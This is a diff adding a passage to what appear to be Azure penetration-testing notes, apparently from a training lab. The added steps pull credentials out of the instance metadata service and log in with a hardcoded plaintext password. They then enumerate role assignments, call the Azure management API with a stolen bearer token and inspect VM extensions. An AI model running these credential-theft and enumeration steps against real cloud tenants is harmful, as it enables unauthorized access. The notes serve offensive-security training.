@@ -1190,5 +1190,37 @@ Hardcoding Credentials is the easiest way to get things done!
 $userData = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"
 [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))
 ```
+
+OK great we have creds, use them for a new logon:
+```
+$password = ConvertTo-SecureString '$7cur7gr@yQamu5913@092' -AsPlainText -Force 
+$creds = New-Object System.Management.Automation.PSCredential('samcgray@defcorphq.onmicrosoft.com', $password) 
+Connect-AzAccount -Credential $creds
+```
+
+Now enum with ```Get-AzResource```:
+```
+Get-AzRoleAssignment -SignInName samcgray@defcorphq.onmicrosoft.com
+```
+
+Doesnt work so fall back to API Call:
+```
+$Token = (Get-AzAccessToken).Token
+$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Research/providers/Microsoft.Compute/virtualMachines/infradminsrv/providers/Microsoft.Authorization/permissions?api-version=2015-07-01'
+$RequestParams = @{
+Method = 'GET'
+Uri = $URI
+Headers = @{
+'Authorization' = "Bearer $Token"
+}
+}
+```
+
+Great we have permissions, so now lets have a read of the extension:
+```
+Get-AzVMExtension -ResourceGroupName "Research" -VMName "infradminsrv"
+```
+
+
 ## Script Extension
 ## Primary Refresh Token
